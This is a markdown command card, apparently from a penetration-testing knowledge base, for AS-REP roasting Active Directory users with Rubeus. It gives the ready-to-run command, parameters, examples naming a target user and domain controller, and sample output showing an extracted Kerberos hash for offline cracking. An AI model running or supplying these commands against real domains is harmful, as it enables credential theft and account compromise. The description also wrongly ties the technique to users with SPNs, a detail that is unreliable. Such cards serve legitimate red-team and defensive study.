---
id: d96df280-419b-44ce-8002-cc8942054849
name: rubeus-asrep-roast-user
type: command
executor: powershell
data: >-
  Rubeus.exe asreproast /user:$_TARGET_USER /format:hashcat
  /outfile:$_OUTPUT_FILE
output: null
created_at: '2023-04-06T03:56:04.983255+00:00'
updated_at: '2023-04-10T20:26:39.227036+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - as-rep
verified: true
validated: true
---

# rubeus-asrep-roast-user

## Command

```powershell
Rubeus.exe asreproast /user:$_TARGET_USER /format:hashcat /outfile:$_OUTPUT_FILE
```

## Description

Requests an AS-REP from the domain controller for the specified user without pre-authentication, extracting the Kerberos hash for offline cracking. Use this in Windows environments targeting AD users with SPNs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /user:$_TARGET_USER | Target username (e.g., TestOU3user) | Yes |
| /format:hashcat | Output format for cracking tools | Yes |
| /outfile:$_OUTPUT_FILE | File to save the hash (e.g., hashes.asreproast) | Yes |

## Examples

### Basic Usage

```powershell
Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast
```

### Advanced Usage

```powershell
Rubeus.exe asreproast /user:TestOU3user /format:john /outfile:hashes.john /dc:dc01.domain.local
```

## Expected Output

[*] Action: AS-REP roasting
[*] Target User: TestOU3user
... (connection details)
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash: $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(hash)

## Related

- [[procedures/Kerberos-AS-REP-Roasting-Attack]]
- [[tools/Rubeus]]
